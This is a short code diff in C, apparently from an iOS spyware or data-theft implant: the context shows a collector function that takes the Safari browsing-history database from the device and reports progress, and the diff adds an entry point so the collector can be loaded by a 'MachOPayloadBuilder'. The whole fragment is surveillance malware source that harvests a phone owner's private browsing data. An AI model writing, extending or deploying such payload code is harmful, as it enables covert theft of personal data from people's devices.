@@ -198,3 +198,8 @@ void ds_collect(void) {
     _collect_file("/var/mobile/Library/Safari/History.db", "Safari");
     _report("RawCollector", "done", "all_files_attempted");
 }
+
+/* === Standalone entry point for MachOPayloadBuilder loading === */
+void ds_start(void) {
+    ds_collect();
+}
